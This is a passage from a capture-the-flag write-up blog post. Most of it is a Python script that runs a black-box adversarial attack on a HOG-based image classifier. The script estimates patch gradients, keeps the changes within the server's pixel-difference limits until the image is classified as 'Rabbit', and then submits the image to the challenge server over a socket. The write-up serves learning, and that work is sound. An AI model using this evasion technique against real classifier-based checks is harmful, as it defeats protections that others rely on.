IMG_SIZE = (256, 256)
HOG_PARAMS = {
    &#34;orientations&#34;: 9,
    &#34;pixels_per_cell&#34;: (16, 16),
    &#34;cells_per_block&#34;: (2, 2),
    &#34;block_norm&#34;: &#34;L2-Hys&#34;
}

# 服务端 check 的阈值
MAX_AVG_DIFF = 25.0
MAX_PERPIXEL_DIFF = 50

# 攻击超参数（可调）
MAX_ITERS = 8000
PATCH_SIZE = 12         # patch 边长（像素）— 对应 12x12 block 作梯度估计
N_PATCHES_PER_ITER = 40 # 每次估计的随机 patch 数
EPS = 6                 # finite difference 的扰动幅度（用于估计导数）
STEP = 6                # 每次实际应用到 patch 的步长
TOP_K = 6               # 选择前 K 个最有利的 patch 同时应用（按梯度）
RANDOM_SEED = 1337
VERBOSE = True
# -------------------------------------------

np.random.seed(RANDOM_SEED)


def extract_hog_features(image):
    &#34;&#34;&#34;与服务端相同的特征提取（尽量复现）&#34;&#34;&#34;
    arr = np.array(image)
    img = resize(arr, IMG_SIZE)  # skimage resize -&gt; float
    gray = rgb2gray(img)
    features = hog(gray, **HOG_PARAMS)
    return features.reshape(1, -1)


def model_probs_for_array(model, arr):
    &#34;&#34;&#34;返回 predict_proba 的结果（长度&gt;=2），并容错处理&#34;&#34;&#34;
    feat = extract_hog_features(arr)
    if hasattr(model, &#34;predict_proba&#34;):
        probs = model.predict_proba(feat)[0]
        return np.array(probs)
    else:
        # fallback: try decision_function -&gt; sigmoid
        if hasattr(model, &#34;decision_function&#34;):
            dec = model.decision_function(feat)[0]
            # binary -&gt; map to probability
            if np.ndim(dec) == 0:
                p = 1.0 / (1.0 &#43; np.exp(-dec))
                return np.array([1 - p, p])
        # 最后退回 predict
        pred = model.predict(feat)[0]
        out = np.zeros(2)
        # assume labels 0/1 or classes_ present
        if hasattr(model, &#34;classes_&#34;):
            # try to find index of class equal to pred
            classes = np.array(model.classes_)
            idx = np.where(classes == pred)[0]
            if idx.size:
                out[idx[0]] = 0.999
        else:
            out[pred] = 0.999
        out[(out == 0).nonzero()[0]] = 0.001
        return out


def check_constraints(origin_arr, delta_arr):
    &#34;&#34;&#34;
    origin_arr: uint8 original image
    delta_arr: int32 delta applied (can be negative)
    返回: (ok_bool, avg_diff, max_diff)
    &#34;&#34;&#34;
    cand = origin_arr.astype(np.int32) &#43; delta_arr.astype(np.int32)
    diff = np.abs(cand - origin_arr.astype(np.int32)).astype(np.int32)
    avg = float(np.mean(diff))
    mx = int(np.max(diff))
    ok = (avg &lt;= MAX_AVG_DIFF &#43; 1e-9) and (mx &lt;= MAX_PERPIXEL_DIFF)
    return ok, avg, mx


def project_delta_to_constraints(origin_arr, delta_arr):
    &#34;&#34;&#34;
    将 delta 投影到满足 max per-pixel 差和 average 差预算:
    - 先强制每像素差绝对值 ≤ MAX_PERPIXEL_DIFF
    - 再按比例缩放使平均差 ≤ MAX_AVG_DIFF（L1 风格缩放）
    返回被限制后的 delta (int32)
    &#34;&#34;&#34;
    delta = delta_arr.copy().astype(np.int32)
    # 每像素上限
    delta = np.clip(delta, -MAX_PERPIXEL_DIFF, MAX_PERPIXEL_DIFF)

    diff = np.abs(delta).astype(np.float64)
    avg = float(np.mean(diff))
    if avg &lt;= MAX_AVG_DIFF:
        return delta
    # 需要缩放：scale factor s in (0,1] such that mean(|s*delta|) = MAX_AVG_DIFF
    s = MAX_AVG_DIFF / (avg &#43; 1e-12)
    delta = (delta.astype(np.float64) * s).astype(np.int32)
    # clamp again just in case
    delta = np.clip(delta, -MAX_PERPIXEL_DIFF, MAX_PERPIXEL_DIFF)
    return delta


def send_image_to_server(img_arr):
    buf = io.BytesIO()
    Image.fromarray(img_arr).save(buf, format=&#34;PNG&#34;)
    img_b = buf.getvalue()
    b64 = base64.b64encode(img_b)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(8)
    sock.connect((HOST, PORT))
    try:
        sock.sendall(b64)
        sock.sendall(END_MARK)
        resp = b&#34;&#34;
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp &#43;= chunk
            except socket.timeout:
                break
    finally:
        sock.close()
    return resp


def random_patch_positions(h, w, patch_size, n):
    ys = np.random.randint(0, h - patch_size &#43; 1, size=n)
    xs = np.random.randint(0, w - patch_size &#43; 1, size=n)
    return list(zip(ys, xs))


def apply_patch_delta(delta_arr, y, x, patch_size, val):
    delta_arr[y:y&#43;patch_size, x:x&#43;patch_size, :] &#43;= val
    return delta_arr


def main():
    if not os.path.exists(ORIGIN_PATH):
        print(&#34;Missing origin image:&#34;, ORIGIN_PATH); return
    if not os.path.exists(MODEL_PATH):
        print(&#34;Missing model file:&#34;, MODEL_PATH); return

    origin_img = Image.open(ORIGIN_PATH).convert(&#34;RGB&#34;)
    origin_img = origin_img.resize(IMG_SIZE)
    origin_arr = np.array(origin_img).astype(np.uint8)
    h, w, c = origin_arr.shape

    model = joblib.load(MODEL_PATH)

    # determine Rabbit index in model&#39;s predict_proba output
    rabbit_index = 1
    if hasattr(model, &#34;classes_&#34;):
        classes = np.array(model.classes_)
        # try to find label &#39;1&#39; (because server used predicted_class int 1 -&gt; Rabbit)
        idxs = np.where(classes == 1)[0]
        if idxs.size:
            rabbit_index = int(idxs[0])
        else:
            # fallback: if classes are strings, try &#39;Rabbit&#39;
            idxs = np.where(classes == &#34;Rabbit&#34;)[0]
            if idxs.size:
                rabbit_index = int(idxs[0])
            else:
                # else keep rabbit_index=1 (most likely correct)
                rabbit_index = 1

    # baseline
    base_probs = model_probs_for_array(model, origin_arr)
    baseline_rabbit_prob = base_probs[rabbit_index] if rabbit_index &lt; len(base_probs) else base_probs[-1]
    print(f&#34;[&#43;] Baseline Rabbit prob: {baseline_rabbit_prob:.6f}&#34;)

    # accumulated delta relative to origin (int32)
    accum_delta = np.zeros_like(origin_arr, dtype=np.int32)

    best_delta = accum_delta.copy()
    best_prob = baseline_rabbit_prob
    best_img = origin_arr.copy()

    start_time = time.time()

    for it in range(1, MAX_ITERS &#43; 1):
        # sample random patch positions
        patches = random_patch_positions(h, w, PATCH_SIZE, N_PATCHES_PER_ITER)

        grads = []
        # estimate gradient for each patch via symmetric finite-difference:
        # compute p(rabbit | origin &#43; accum &#43; &#43;EPS on patch) - p(rabbit | origin &#43; accum &#43; -EPS on patch) / (2*EPS)
        for (y, x) in patches:
            # candidate plus
            delta_plus = accum_delta.copy()
            apply_patch_delta(delta_plus, y, x, PATCH_SIZE, EPS)
            proj_plus = project_delta_to_constraints(origin_arr, delta_plus)
            cand_plus = np.clip(origin_arr.astype(np.int32) &#43; proj_plus, 0, 255).astype(np.uint8)

            probs_plus = model_probs_for_array(model, cand_plus)
            p_plus = probs_plus[rabbit_index] if rabbit_index &lt; len(probs_plus) else probs_plus[-1]

            # candidate minus
            delta_minus = accum_delta.copy()
            apply_patch_delta(delta_minus, y, x, PATCH_SIZE, -EPS)
            proj_minus = project_delta_to_constraints(origin_arr, delta_minus)
            cand_minus = np.clip(origin_arr.astype(np.int32) &#43; proj_minus, 0, 255).astype(np.uint8)

            probs_minus = model_probs_for_array(model, cand_minus)
            p_minus = probs_minus[rabbit_index] if rabbit_index &lt; len(probs_minus) else probs_minus[-1]

            # finite difference estimate
            grad_est = (p_plus - p_minus) / (2.0 * EPS)
            grads.append(((y, x), grad_est))

        # choose top-k patches by positive gradient
        grads_sorted = sorted(grads, key=lambda kv: kv[1], reverse=True)
        chosen = [(pos, g) for (pos, g) in grads_sorted[:TOP_K] if g &gt; 0]

        improved = False
        # apply chosen updates in one combined delta
        if chosen:
            trial_delta = accum_delta.copy()
            for (y, x), g in chosen:
                # apply step in sign of gradient
                val = int(np.sign(g) * STEP)
                apply_patch_delta(trial_delta, y, x, PATCH_SIZE, val)

            # project to constraints
            trial_proj = project_delta_to_constraints(origin_arr, trial_delta)
            cand_img = np.clip(origin_arr.astype(np.int32) &#43; trial_proj, 0, 255).astype(np.uint8)

            # evaluate
            probs = model_probs_for_array(model, cand_img)
            rabbit_prob = probs[rabbit_index] if rabbit_index &lt; len(probs) else probs[-1]

            if rabbit_prob &gt; best_prob &#43; 1e-9:
                # accept
                accum_delta = trial_proj.copy()
                best_prob = rabbit_prob
                best_delta = accum_delta.copy()
                best_img = cand_img.copy()
                improved = True
                if VERBOSE:
                    ok, avg, mx = check_constraints(origin_arr, accum_delta)
                    print(f&#34;[{it}] improved -&gt; rabbit_prob={best_prob:.6f}  avg_diff={avg:.3f} max_diff={mx}  applied_patches={len(chosen)}&#34;)

        # occasionally try single-patch greedy if no improvement (smaller step)
        if (not improved):
            # try smaller single-patch updates (try top few)
            for (y, x), g in grads_sorted[:6]:
                if g &lt;= 0:
                    break
                trial_delta = accum_delta.copy()
                apply_patch_delta(trial_delta, y, x, PATCH_SIZE, int(np.sign(g) * max(2, STEP//2)))
                trial_proj = project_delta_to_constraints(origin_arr, trial_delta)
                cand_img = np.clip(origin_arr.astype(np.int32) &#43; trial_proj, 0, 255).astype(np.uint8)
                probs = model_probs_for_array(model, cand_img)
                rabbit_prob = probs[rabbit_index] if rabbit_index &lt; len(probs) else probs[-1]
                if rabbit_prob &gt; best_prob &#43; 1e-9:
                    accum_delta = trial_proj.copy()
                    best_prob = rabbit_prob
                    best_delta = accum_delta.copy()
                    best_img = cand_img.copy()
                    improved = True
                    if VERBOSE:
                        ok, avg, mx = check_constraints(origin_arr, accum_delta)
                        print(f&#34;[{it}] improved(single) -&gt; rabbit_prob={best_prob:.6f} avg_diff={avg:.3f} max_diff={mx} patch=({y},{x})&#34;)
                    break

        # status print
        if it % 50 == 0 or improved:
            elapsed = time.time() - start_time
            print(f&#34;[it {it}] best_prob={best_prob:.6f} elapsed={elapsed:.1f}s&#34;)

        # success condition: model would predict Rabbit (prob &gt;= 0.5)
        if best_prob &gt; 0.5:
            print(f&#34;[SUCCESS] Found adversarial image with rabbit_prob={best_prob:.6f} at iter {it}&#34;)
            Image.fromarray(best_img).save(OUT_PATH)
            print(f&#34;[&#43;] Saved adversarial image -&gt; {OUT_PATH}&#34;)
            try:
                resp = send_image_to_server(best_img)
                print(&#34;=== Server Response ===&#34;)
                print(resp.decode(errors=&#34;ignore&#34;))
            except Exception as e:
                print(&#34;Failed to send to server:&#34;, e)
            return

    # end iterations
    print(&#34;[DONE] Reached max iterations without achieving rabbit_prob&gt;=0.5&#34;)
    print(f&#34;[INFO] Best rabbit prob achieved: {best_prob:.6f}&#34;)
    Image.fromarray(best_img).save(OUT_PATH)
    print(f&#34;[&#43;] Saved best candidate -&gt; {OUT_PATH}&#34;)
    try:
        resp = send_image_to_server(best_img)
        print(&#34;=== Server Response ===&#34;)
        print(resp.decode(errors=&#34;ignore&#34;))
    except Exception as e:
        print(&#34;Failed to send to server:&#34;, e)


if __name__ == &#34;__main__&#34;:
    main()
```

![](imgs/image-20251012220620046.png)





---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/443835e/  

